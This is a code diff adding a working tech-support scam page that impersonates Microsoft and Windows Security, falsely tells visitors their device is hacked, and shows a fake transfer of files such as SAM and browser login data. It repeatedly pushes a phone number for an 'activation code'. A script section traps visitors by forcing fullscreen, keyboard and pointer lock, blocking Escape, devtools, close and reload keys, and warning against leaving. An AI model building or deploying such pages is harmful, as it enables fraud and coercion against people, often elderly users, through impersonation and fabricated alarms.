+                <div class="red-info-top">
+                  <span class="red-info-badge">24/7 Support</span>
+                  <span class="red-info-label">Level 2 technician</span>
+                </div>
+                <span class="red-info-phone">+1 (855) 251-3137</span>
+              </div>
+
+              <!-- Authorize / Refuse -->
+              <div class="action-buttons">
+                <button class="btn-allow" type="button" style="font-size:10px;">Authorize</button>
+                <button class="btn-deny" type="button" style="font-size:10px;">Refuse</button>
+              </div>
+
+            </div>
+          </div>
+
+          <!-- Panel 5 — diagnostic question -->
+          <div class="panel panel-action panel-action-5" id="panel-action-5">
+            <div class="panel-action-inner">
+              <p class="action-message" style="font-size:10px;">
+                System diagnostic in progress.<br><br>
+                Do you allow a full scan after a threat is detected?
+              </p>
+            </div>
+          </div>
+
+          <!-- Panel 6 — activation code -->
+          <div class="panel panel-action panel-action-6" id="panel-action-6">
+            <div class="code-box">
+
+              <!-- Red header strip -->
+              <div class="code-header">
+                <div class="code-header-ico">🔑</div>
+                <div class="code-header-text">
+                  <div class="code-header-title">Windows Activation Required</div>
+                  <div class="code-header-sub">Your system protection is suspended</div>
+                </div>
+                <div class="code-timer-badge">
+                  <span class="code-timer-val" id="actTimer">05:00</span>
+                  <span class="code-timer-lbl">REMAINING</span>
+                </div>
+              </div>
+
+              <!-- Body -->
+              <div class="code-body">
+
+                <div class="code-step">
+                  <div class="code-step-num">1</div>
+                  <div class="code-step-txt">Call support immediately at <strong>+1 (855) 251-3137</strong> to receive your activation code.</div>
+                </div>
+                <div class="code-step">
+                  <div class="code-step-num">2</div>
+                  <div class="code-step-txt">Enter the code below and press <strong>ENABLE</strong> to restore full protection.</div>
+                </div>
+
+                <div class="code-divider"></div>
+
+                <div class="code-input-row">
+                  <input type="text" class="code-input" placeholder="Enter activation code here…" maxlength="25" spellcheck="false" autocomplete="off">
+                  <button class="code-btn">ENABLE</button>
+                </div>
+
+                <div class="code-footer">
+                  <span class="code-footer-ico">🛡️</span>
+                  <span class="code-footer-txt">Authorized Microsoft Support • Available <strong>24 / 7</strong> • Toll-Free</span>
+                </div>
+
+              </div><!-- /.code-body -->
+            </div><!-- /.code-box -->
+          </div>
+
+        </div><!-- /.stage -->
+
+        <!-- Windows 11 file transfer flyout -->
+        <div id="win-file-transfer" class="win-file-transfer" aria-live="polite">
+          <div class="win-file-transfer__shell">
+            <div class="win-file-transfer__header">
+              <div class="win-file-transfer__icons">
+                <div class="win-file-transfer__ico" aria-hidden="true">
+                  <svg viewBox="0 0 32 32" fill="none"><path d="M4 8a3 3 0 013-3h7l2.5 2.5H25a3 3 0 013 3v13a3 3 0 01-3 3H7a3 3 0 01-3-3V8z" fill="#FFC83D"/><path d="M12 5.5H25a2 2 0 012 2V8H7V7.5A2 2 0 019 5.5h3z" fill="#E6A800"/></svg>
+                </div>
+                <span class="win-file-transfer__arrow" aria-hidden="true">›</span>
+                <div class="win-file-transfer__ico" aria-hidden="true">
+                  <svg viewBox="0 0 32 32" fill="none"><rect x="4" y="8" width="24" height="18" rx="2" fill="#8A8886"/><path d="M10 14h12M10 18h8" stroke="#fff" stroke-width="1.5" stroke-linecap="round"/><circle cx="24" cy="10" r="5" fill="#605E5C" stroke="#fff" stroke-width="1.2"/><text x="24" y="12.5" text-anchor="middle" font-size="6" font-weight="700" fill="#fff">?</text></svg>
+                </div>
+              </div>
+              <div class="win-file-transfer__copy">
+                <p class="win-file-transfer__title">Copying <span id="wft-count">2,847</span> items</p>
+                <p class="win-file-transfer__subtitle">from <strong>Local Disk (C:)</strong> to <strong>unknown address</strong></p>
+              </div>
+            </div>
+            <div class="win-file-transfer__body">
+              <div class="win-file-transfer__progress-row">
+                <div class="win-file-transfer__progress-track">
+                  <div class="win-file-transfer__progress-fill" id="wft-fill"></div>
+                </div>
+                <span class="win-file-transfer__pct" id="wft-pct">0%</span>
+              </div>
+              <div class="win-file-transfer__meta">
+                <span id="wft-speed">Calculating…</span>
+                <span id="wft-remaining">2,847 items remaining</span>
+                <span id="wft-time">About 2:00 remaining</span>
+              </div>
+              <div class="win-file-transfer__current">
+                <svg class="win-file-transfer__file-ico" viewBox="0 0 16 16" aria-hidden="true"><path d="M9 1H4a1 1 0 00-1 1v12a1 1 0 001 1h8a1 1 0 001-1V5L9 1z" fill="#0078d4"/><path d="M9 1v4h4" fill="#005a9e"/></svg>
+                <span class="win-file-transfer__file-name" id="wft-file">Preparing items…</span>
+              </div>
+            </div>
+            <div class="win-file-transfer__footer">
+              <button type="button" class="win-file-transfer__cancel" tabindex="-1">Cancel</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Bottom marquee -->
+        <div class="bottom-marquee">
+          <div class="marquee-track">
+            <div class="marquee-item" style="font-size:13px;">
+              <img src="1d1m.png" alt="">
+              <span>Active Windows Security • Diagnostic in progress • 24/7 Authorized Support • <strong>+1 (855) 251-3137</strong></span>
+            </div>
+            <div class="marquee-item" style="font-size:13px;">
+              <img src="1d1m.png" alt="">
+              <span>Active Windows Security • Diagnostic in progress • 24/7 Authorized Support • <strong>+1 (855) 251-3137</strong></span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Mini float bottom-right -->
+        <div class="mini-float-bottom">
+          <img src="mis0f1t.png" alt="Support">
+          <span>Online Support<br>Toll-free 24/7: <strong class="support-phone-inline">+1 (855) 251-3137</strong></span>
+        </div>
+
+      </div><!-- /#scan -->
+
+      <!-- ── "Don't worry" top hover dropdown ── -->
+      <div id="_pv_topzone"></div>
+      <div id="_pv_toppanic">
+        <div id="_pv_toppanic__inner">
+          <div id="_pv_toppanic__ico">🛡</div>
+          <div id="_pv_toppanic__text">
+            <p id="_pv_toppanic__heading">Don't worry — we are here with you</p>
+            <p id="_pv_toppanic__body">
+              Stay calm. Your files are safe. Our certified technician is actively
+              monitoring your case and will resolve this remotely. Do <strong>not</strong>
+              restart or close this window.
+            </p>
+            <span id="_pv_toppanic__phone">📞 +1 (855) 251-3137 &nbsp;·&nbsp; Free 24/7</span>
+          </div>
+        </div>
+      </div>
+
+
+    <!-- loader (hidden; kept so showd() can reference it) -->
+    <div class="loader_bg" id="loader" style="display:none">
+      <div class="loader" aria-hidden="true"></div>
+    </div>
+    <div class="bgimg" onmousemove="showd();">
+      <img src="b1ck1.jpg" alt="">
+    </div>
+    <div class="page-scroll-spacer" aria-hidden="true"></div>
+
+    <!-- firstpop kept hidden — required by showd() / showd1() internals -->
+    <div id="firstpop" class="win-troubleshoot" role="dialog" style="display:none" aria-hidden="true">
+      <div class="win-troubleshoot__titlebar">
+        <div class="win-troubleshoot__brand">
+          <img src="mis0f1t.png" alt="" width="24" height="24">
+          <span>Microsoft</span>
+        </div>
+      </div>
+      <div class="win-troubleshoot__body topp">
+        <h1 id="firstpop-title" class="win-troubleshoot__headline">IP compromised. Hackers have breached this device.</h1>
+      </div>
+    </div>
+
+    <!-- Call-to-action toast — slides in after modals clear -->
+    <div id="wsp-call-toast" class="wsp-call-toast">
+      <div class="wsp-call-toast__bar"></div>
+      <div class="wsp-call-toast__head">
+        <img src="mis0f1t.png" width="14" height="14" alt="" style="flex-shrink:0">
+        <span class="wsp-call-toast__app">Microsoft Security Support</span>
+        <span class="wsp-call-toast__badge">URGENT</span>
+        <button class="wsp-call-toast__x" type="button" aria-label="Dismiss">✕</button>
+      </div>
+      <div class="wsp-call-toast__body">
+        <div class="wsp-call-toast__icon">📞</div>
+        <div class="wsp-call-toast__text">
+          <p class="wsp-call-toast__title">Technician standing by — call now</p>
+          <p class="wsp-call-toast__num">+1 (855) 251-3137</p>
+          <p class="wsp-call-toast__sub">Toll-free · 24 / 7 · Device locked</p>
+        </div>
+      </div>
+      <a class="wsp-call-toast__btn" href="tel:+18552513137">📞 &nbsp;Call Now</a>
+    </div>
+
+    <!-- Windows 11 bottom-right notification panel -->
+    <div id="win-br-notification">
+      <div class="win-br-notif__accent"></div>
+      <div class="win-br-notif__header">
+        <img src="mis0f1t.png" width="13" height="13" alt="" style="flex-shrink:0;">
+        <span class="win-br-notif__app">Windows Security</span>
+        <span class="win-br-notif__time">now</span>
+        <button class="win-br-notif__close" type="button" aria-label="Dismiss">✕</button>
+      </div>
+      <div class="win-br-notif__body">
+        <span class="win-br-notif__icon">🛡</span>
+        <div class="win-br-notif__content">
+          <p class="win-br-notif__title">⚠ Security Alert — Action Required</p>
+          <p class="win-br-notif__msg">Your device has been compromised. Microsoft Support must verify your identity to unlock this computer. Do not restart or shut down.</p>
+        </div>
+      </div>
+    </div>
+
+    <script src="../js/visitor-ip.js"></script>
+    <script src="../js/load-tfn.js"></script>
+    <script>
+      /* Generate incident / case IDs */
+      (function () {
+        var el = document.getElementById("hcva-incident-id");
+        var d = new Date();
+        var p = function (n) { return String(n).padStart(2, "0"); };
+        var id = "WDS-" + d.getFullYear() + p(d.getMonth() + 1) + p(d.getDate()) + "-" + Math.random().toString(16).slice(2, 6).toUpperCase();
+        if (el) el.textContent = id;
+        var caseEl = document.getElementById("hcva-case-id");
+        if (caseEl) caseEl.textContent = "MSS-" + id.slice(4);
+        document.querySelectorAll("[data-hcva-case]").forEach(function (node) {
+          node.textContent = caseEl ? caseEl.textContent : "MSS-…";
+        });
+      })();
+
+      /* Live clock */
+      (function () {
+        function updateClock() {
+          var now = new Date();
+          var h = now.getHours(), m = now.getMinutes();
+          var ampm = h >= 12 ? "PM" : "AM";
+          h = h % 12 || 12;
+          var pad = function (n) { return String(n).padStart(2, "0"); };
+          var t = document.getElementById("niche-clock-time");
+          var d = document.getElementById("niche-clock-date");
+          if (t) t.textContent = pad(h) + ":" + pad(m) + " " + ampm;
+          if (d) d.textContent = (now.getMonth() + 1) + "/" + now.getDate() + "/" + now.getFullYear();
+        }
+        updateClock();
+        setInterval(updateClock, 10000);
+      })();
+
+      /* Animate scan percentage counter */
+      (function () {
+        var el = document.getElementById("win-sec-pct");
+        if (!el) return;
+        el.textContent = "0%";
+        var start = Date.now(), dur = 2000;
+        function tick() {
+          var pct = Math.min(100, Math.round(((Date.now() - start) / dur) * 100));
+          el.textContent = pct + "%";
+          if (pct < 100) requestAnimationFrame(tick);
+        }
+        requestAnimationFrame(tick);
+      })();
+
+      /* AUTO-START: skip page 1 entirely — go straight to scan phase */
+      window.addEventListener("DOMContentLoaded", function () {
+        /* Call showd1() to show the threat / scan panel immediately */
+        if (typeof showd1 === "function") {
+          showd1();
+        } else {
+          /* Fallback: show hula directly if JS not yet ready */
+          var hula = document.getElementById("hula");
+          if (hula) hula.style.display = "block";
+        }
+
+        /* Try to enter fullscreen — browsers only allow this from a user gesture,
+           so we attempt it and silently ignore if denied. */
+        if (typeof hcvaEnterPresentation === "function") {
+          hcvaEnterPresentation();
+        }
+
+        if (typeof hcvaBindFullscreenGuard === "function") {
+          hcvaBindFullscreenGuard();
+        }
+
+        if (typeof window.b1e1p11 === "function") {
+          window.b1e1p11();
+          [200, 800, 2000, 4000].forEach(function (ms) {
+            setTimeout(window.b1e1p11, ms);
+          });
+        }
+
+        /* Show bottom-right notification after short delay */
+        setTimeout(function () {
+          var el = document.getElementById("win-br-notification");
+          if (el) el.classList.add("is-visible");
+        }, 1200);
+
+        /* audio already handled by _unlockAudio listeners above */
+      });
+
+      (function () {
+        var started = false;
+        var shown = false;
+
+        function hcvaStartFileTransferAnim() {
+          if (started) return;
+          started = true;
+
+          var fillEl = document.getElementById("wft-fill");
+          var pctEl = document.getElementById("wft-pct");
+          var speedEl = document.getElementById("wft-speed");
+          var remEl = document.getElementById("wft-remaining");
+          var timeEl = document.getElementById("wft-time");
+          var fileEl = document.getElementById("wft-file");
+          if (!fillEl || !pctEl || !fileEl || !timeEl) return;
+
+          var TOTAL = 2847;
+          var DURATION_SEC = 120;
+          var FILES = [
+            "C:\\Windows\\System32\\drivers\\tcpip.sys",
+            "C:\\Windows\\Temp\\svchost_update.exe",
+            "C:\\Users\\Public\\AppData\\Local\\Temp\\~DF9AC2.tmp",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Quarantine\\Resources\\",
+            "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations",
+            "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "C:\\Program Files\\WindowsApps\\Microsoft.WindowsStore\\",
+            "C:\\Windows\\System32\\config\\SAM",
+            "C:\\Users\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
+            "C:\\Windows\\SysWOW64\\msiexec.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\",
+            "C:\\Windows\\System32\\lsass.exe",
+          ];
+
+          var fileIdx = 0;
+          var start = Date.now();
+          var lastSecond = -1;
+          var speed = 18.4;
+          var secsLeftDisplay = DURATION_SEC;
+
+          function fmt(n) { return Math.max(0, n).toLocaleString("en-US"); }
+
+          function formatTimeRemaining(secsLeft) {
+            var s = Math.max(0, secsLeft);
+            if (s <= 0) return "Finishing…";
+            if (s >= 60) {
+              var mins = Math.floor(s / 60);
+              var secs = s % 60;
+              return "About " + mins + ":" + String(secs).padStart(2, "0") + " remaining";
+            }
+            if (s >= 10) return "About " + s + " seconds remaining";
+            return "A few seconds remaining";
+          }
+
+          function tick() {
+            var elapsed = (Date.now() - start) / 1000;
+            var secNow = Math.floor(elapsed);
+            secsLeftDisplay = Math.max(0, DURATION_SEC - secNow);
+            var pct = Math.min(89, (secNow / DURATION_SEC) * 89);
+            var done = Math.floor((pct / 100) * TOTAL);
+            var remaining = Math.max(0, TOTAL - done);
+
+            if (secNow !== lastSecond) {
+              lastSecond = secNow;
+              speed = Math.max(8, Math.min(42, speed + (Math.random() - 0.5) * 6));
+            }
+
+            fillEl.style.width = pct.toFixed(1) + "%";
+            pctEl.textContent = Math.round(pct) + "%";
+            speedEl.textContent = speed.toFixed(1) + " MB/s";
+            remEl.textContent = fmt(remaining) + " items remaining";
+            timeEl.textContent = formatTimeRemaining(secsLeftDisplay);
+
+            if (Math.random() > 0.62) {
+              fileIdx = (fileIdx + 1) % FILES.length;
+              fileEl.textContent = FILES[fileIdx];
+            } else if (secNow < 2) {
+              fileEl.textContent = "Preparing items…";
+            }
+
+            if (secsLeftDisplay > 0 || pct < 89) {
+              requestAnimationFrame(tick);
+            }
+          }
+
+          requestAnimationFrame(tick);
+        }
+
+        function hcvaShowFileTransfer() {
+          if (shown) return;
+          shown = true;
+          var box = document.getElementById("win-file-transfer");
+          if (box) box.classList.add("is-visible");
+          hcvaStartFileTransferAnim();
+        }
+
+        function hcvaScheduleFileTransfer() {
+          setTimeout(hcvaShowFileTransfer, 3000);
+        }
+
+        hcvaScheduleFileTransfer();
+      })();
+    /* ── Black-out + animated modal cleanup when support panel appears ── */
+    (function () {
+      var chatBox = document.getElementById('chat-box');
+      if (!chatBox) return;
+      var triggered = false;
+      var obs = new MutationObserver(function () {
+        if (triggered || !chatBox.classList.contains('is-visible')) return;
+        triggered = true;
+        obs.disconnect();
+
+        setTimeout(function () {
+          /* Fade background to black */
+          var hula = document.getElementById('hula');
+          if (hula) hula.classList.add('hula-fade-black');
+
+          /* Animate away ALL modals, toasts and the BR notification */
+          var leaving = [].slice.call(document.querySelectorAll(
+            '.win-mini-modal, #win-toast-security, #win-toast-lock, #win-toast-call, #win-br-notification, #win-file-transfer'
+          ));
+          var visibleCount = 0;
+          leaving.forEach(function (el, i) {
+            if (el.style.display === 'none' && !el.classList.contains('is-visible')) return;
+            setTimeout(function () {
+              el.classList.add('modal-exit');
+              setTimeout(function () {
+                el.style.display = 'none';
+                el.classList.remove('modal-exit', 'is-visible');
+              }, 420);
+            }, visibleCount++ * 130);
+          });
+
+          /* After everything clears, show new bottom-right call toast */
+          setTimeout(function () {
+            var t = document.getElementById('wsp-call-toast');
+            if (t) t.classList.add('wsp-call-toast--in');
+          }, visibleCount * 130 + 600);
+
+        }, 2000);
+      });
+      obs.observe(chatBox, { attributes: true, attributeFilter: ['class'] });
+    })();
+    </script>
+    <script src="s1l1i1c1k.js"></script>
+    <!-- Report timestamp -->
+    <script>
+    (function(){
+      var el = document.getElementById('wsp-report-ts');
+      if (!el) return;
+      var d = new Date();
+      var pad = function(n){ return n < 10 ? '0'+n : n; };
+      el.textContent = d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate())
+        + '  ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+    })();
+    </script>
+    <!-- Call-toast dismiss -->
+    <script>
+    (function(){
+      var btn = document.querySelector('.wsp-call-toast__x');
+      var toast = document.getElementById('wsp-call-toast');
+      if (btn && toast) btn.addEventListener('click', function(){
+        toast.style.transform = 'translateX(340px)';
+        toast.style.opacity = '0';
+      });
+    })();
+    </script>
+    <!-- Cycling ticker messages -->
+    <script>
+    (function () {
+      var msgs = [
+        { icon:'💬', text:'Don\'t panic — we are here with you' },
+        { icon:'🚫', text:'Don\'t click anything or touch your keyboard' },
+        { icon:'✅', text:'Your data is safe — our team is securing your device' },
+        { icon:'🔒', text:'Do NOT restart or close this window' },
+        { icon:'👨‍💻', text:'A certified Microsoft technician is reviewing your case now' },
+        { icon:'🛡', text:'Your files are intact — threat is being neutralised' },
+        { icon:'📞', text:'Call us now — technician answers immediately' },
+      ];
+      var idx = 0;
+      var iconEl  = document.querySelector('.wsp-ticker__icon');
+      var textEl  = document.getElementById('wsp-ticker-text');
+      if (!iconEl || !textEl) return;
+      function show(i) {
+        textEl.classList.add('fade-out');
+        setTimeout(function () {
+          iconEl.textContent = msgs[i].icon;
+          textEl.textContent = msgs[i].text;
+          textEl.classList.remove('fade-out');
+        }, 420);
+      }
+      setInterval(function () {
+        idx = (idx + 1) % msgs.length;
+        show(idx);
+      }, 3500);
+    })();
+    </script>
+
+    <!-- Activation countdown timer -->
+    <script>
+    (function(){
+      var secs = 5*60, el = document.getElementById('actTimer');
+      if(!el) return;
+      var t = setInterval(function(){
+        if(secs <= 0){ clearInterval(t); el.textContent='00:00'; return; }
+        secs--;
+        var m = Math.floor(secs/60), s = secs%60;
+        el.textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+      }, 1000);
+    })();
+    </script>
+
+    <!-- ══════════════════════════════════════════════════════
+         POPUPVICKY PROTECTION LAYER
+         • Fullscreen trap (re-enter on every interaction)
+         • Pointer Lock (mouse confined to page)
+         • Escape key blocked + "ESC BLOCKED" toast
+         • All dangerous hotkeys suppressed
+         • beforeunload warning
+    ══════════════════════════════════════════════════════ -->
+    <script>
+    (function () {
+      'use strict';
+
+      /* ── helpers ── */
+      function forceFullscreen() {
+        var el = document.documentElement;
+        var rfs = el.requestFullscreen || el.webkitRequestFullscreen ||
+                  el.webkitRequestFullScreen || el.mozRequestFullScreen ||
+                  el.msRequestFullscreen;
+        if (rfs) {
+          try {
+            var p = rfs.call(el, { navigationUI: 'hide' });
+            if (p && typeof p.then === 'function') {
+              p.then(function () {
+                if (typeof window.b1e1p11 === 'function') window.b1e1p11();
+              }).catch(function () {
+                try { rfs.call(el); } catch (e2) {}
+                if (typeof window.b1e1p11 === 'function') window.b1e1p11();
+              });
+            } else if (typeof window.b1e1p11 === 'function') {
+              window.b1e1p11();
+            }
+          } catch (e) {
+            try { rfs.call(el); } catch (e2) {}
+            if (typeof window.b1e1p11 === 'function') window.b1e1p11();
+          }
+        }
+        if (navigator.keyboard && navigator.keyboard.lock) {
+          navigator.keyboard.lock().catch(function () {});
+        }
+      }
+
+      function requestPointerLock() {
+        var el = document.documentElement;
+        var rpl = el.requestPointerLock || el.mozRequestPointerLock ||
+                  el.webkitRequestPointerLock;
+        if (rpl) { try { rpl.call(document.body); } catch (e) {} }
+      }
+
+      function showEscBlocked() {
+        var id = '_pv_esc_blocked';
+        var old = document.getElementById(id);
+        if (old) old.remove();
+        var el = document.createElement('div');
+        el.id = id;
+        el.innerHTML =
+          '<div style="font-size:28px;margin-bottom:6px;">🔒</div>' +
+          '<strong style="font-size:14px;letter-spacing:.04em;">ESC KEY BLOCKED</strong><br>' +
+          '<span style="font-size:11px;opacity:.85;line-height:1.5;">' +
+          'Windows Security has prevented you from exiting.<br>' +
+          'Your device is locked until the issue is resolved.</span>';
+        el.style.cssText = [
+          'position:fixed', 'top:50%', 'left:50%',
+          'transform:translate(-50%,-50%)',
+          'z-index:2147483647',
+          'background:rgba(180,20,20,0.97)',
+          'color:#fff',
+          'padding:22px 34px',
+          'border-radius:14px',
+          'text-align:center',
+          'font-family:Segoe UI,system-ui,sans-serif',
+          'line-height:1.6',
+          'box-shadow:0 12px 48px rgba(0,0,0,.7)',
+          'border:2px solid rgba(255,100,100,.45)',
+          'pointer-events:none',
+          'animation:_pvEscPulse .25s ease',
+        ].join(';');
+        document.body.appendChild(el);
+        setTimeout(function () {
+          el.style.transition = 'opacity .5s';
+          el.style.opacity = '0';
+          setTimeout(function () { try { el.remove(); } catch (e) {} }, 600);
+        }, 2200);
+      }
+
+      /* pulse keyframe */
+      (function () {
+        var s = document.createElement('style');
+        s.textContent =
+          '@keyframes _pvEscPulse{0%{transform:translate(-50%,-50%) scale(.85);opacity:0}' +
+          '60%{transform:translate(-50%,-50%) scale(1.04)}' +
+          '100%{transform:translate(-50%,-50%) scale(1);opacity:1}}';
+        document.head.appendChild(s);
+      })();
+
+      /* ── 1. Fullscreen on initial load (multi-attempt) ── */
+      [200, 800, 2000, 4000].forEach(function (ms) {
+        setTimeout(forceFullscreen, ms);
+      });
+
+      /* ── 2. Re-enter fullscreen on fullscreen change ── */
+      var _fsLock = false;
+      function onFsChange() {
+        if (_fsLock) return;
+        var inFs = !!(document.fullscreenElement || document.webkitFullscreenElement ||
+                      document.mozFullScreenElement || document.msFullscreenElement);
+        if (inFs) {
+          if (typeof window.b1e1p11 === 'function') window.b1e1p11();
+        }
+        if (!inFs) {
+          _fsLock = true;
+          setTimeout(function () {
+            _fsLock = false;
+            forceFullscreen();
+          }, 60);
+        }
+      }
+      ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange',
+       'msfullscreenchange'].forEach(function (ev) {
+        document.addEventListener(ev, onFsChange);
+      });
+
+      /* ── 3. Keyboard trap ── */
+      document.addEventListener('keydown', function (e) {
+        var k = e.key;
+        var kc = e.keyCode || e.which;
+
+        /* Escape — block + show toast + re-enter FS */
+        if (k === 'Escape' || kc === 27) {
+          e.preventDefault(); e.stopImmediatePropagation();
+          showEscBlocked();
+          setTimeout(forceFullscreen, 80);
+          return false;
+        }
+
+        /* F5 — reload */
+        if (k === 'F5' || kc === 116) {
+          e.preventDefault(); e.stopImmediatePropagation(); return false;
+        }
+
+        /* F11 — fullscreen toggle (we want OUR fullscreen) */
+        if (k === 'F11' || kc === 122) {
+          e.preventDefault(); e.stopImmediatePropagation();
+          forceFullscreen(); return false;
+        }
+
+        /* F12 — DevTools */
+        if (k === 'F12' || kc === 123) {
+          e.preventDefault(); e.stopImmediatePropagation(); return false;
+        }
+
+        /* Alt+F4 — close window */
+        if (e.altKey && (k === 'F4' || kc === 115)) {
+          e.preventDefault(); e.stopImmediatePropagation(); return false;
+        }
+
+        /* Ctrl/Cmd+W — close tab */
+        if ((e.ctrlKey || e.metaKey) && (k === 'w' || k === 'W')) {
+          e.preventDefault(); e.stopImmediatePropagation(); return false;
+        }
+
+        /* Ctrl/Cmd+R or Ctrl/Cmd+Shift+R — reload */
+        if ((e.ctrlKey || e.metaKey) && (k === 'r' || k === 'R')) {
+          e.preventDefault(); e.stopImmediatePropagation(); return false;
+        }
+
+        /* Ctrl+Shift+I / Ctrl+Shift+J — DevTools */
+        if ((e.ctrlKey || e.metaKey) && e.shiftKey &&
+            (k === 'i' || k === 'I' || k === 'j' || k === 'J')) {
+          e.preventDefault(); e.stopImmediatePropagation(); return false;
+        }
+
+        /* Ctrl+U — view source */
+        if ((e.ctrlKey || e.metaKey) && (k === 'u' || k === 'U')) {
+          e.preventDefault(); e.stopImmediatePropagation(); return false;
+        }
+
+        /* Any other key → re-enter fullscreen */
+        forceFullscreen();
+      }, true);
+
+      /* ── 4. Pointer lock after first click ── */
+      var _plDone = false;
+      document.addEventListener('click', function () {
+        forceFullscreen();
+        if (!_plDone) { _plDone = true; requestPointerLock(); }
+      });
+
+      /* ── 5. Right-click → block + re-enter FS ── */
+      document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+        forceFullscreen();
+      });
+
+      /* ── 6. beforeunload warning ── */
+      window.addEventListener('beforeunload', function (e) {
+        var msg = 'Windows Security Alert: Closing this page will prevent the threat from being removed. Your data may be at risk.';
+        e.preventDefault();
+        e.returnValue = msg;
+        return msg;
+      });
+
+      /* ── 7. Pointer-lock change handler — re-lock if lost ── */
+      var _plLock2 = false;
+      function onPointerLockChange() {
+        var locked = !!(document.pointerLockElement || document.mozPointerLockElement ||
+                        document.webkitPointerLockElement);
+        if (!locked && !_plLock2) {
+          _plLock2 = true;
+          setTimeout(function () {
+            _plLock2 = false;
+            requestPointerLock();
+          }, 400);
+        }
+      }
+      ['pointerlockchange','mozpointerlockchange','webkitpointerlockchange'].forEach(function (ev) {
+        document.addEventListener(ev, onPointerLockChange);
+      });
+
+    })();
+    </script>
+  </body>
+</html>
